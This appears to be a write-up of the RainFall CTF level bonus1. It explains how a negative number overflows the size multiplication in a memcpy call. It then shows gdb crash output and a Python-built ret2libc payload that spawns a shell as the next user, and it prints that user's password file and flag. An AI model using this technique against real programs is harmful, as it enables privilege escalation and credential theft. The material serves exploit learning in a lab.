Here, we cannot give a number greater than 9 as first argument, else we won't be able to try to overflow the `memcpy`.
Since the number given is multiplied by 4, we can try to overflow the first argument. Indeed, since memcpy's third argument is a `size_t`, on a 32bits system, the `size_t` type is only on 4 bytes.

So, since uint32 max value = 4294967295, if we want to overflow, we need a this base value :

```mathematica
(4294967295 + 1) / 4 = 1073741824
```

We take that as a negative value so `-1073741824`
Then, we try to make this segfault. With this given number, the memcpy is copying 0 bytes.
So if, for example, we give `-1073741800`, we will copy `24*4 = 96` bytes :

>bonus1@RainFall:~$ gdb -q --args ./bonus1 -1073741800 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIILLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXX
>Reading symbols from /home/user/bonus1/bonus1...(no debugging symbols found)...done.
>(gdb) run
>Starting program: /home/user/bonus1/bonus1 -1073741800 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIILLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXX
>Program received signal SIGSEGV, Segmentation fault.
>0x51515151 in ?? ()

Here, we have a segfault on the bytes corresponding to the `Qs`.
So, we can try to call `/bin/sh` the same way we did in `level1` : 

>bonus1@RainFall:~$ ./bonus1 -1073741800 `python -c 'print("A" * 56 + "\x60\xb0\xe6\xb7" + "IDGB" + "\x58\xcc\xf8\xb7" + "A" * 28)'`
>$ whoami
>bonus2
>$ cat /home/user/bonus2/.pass
>579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245

```bash
su bonus2
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

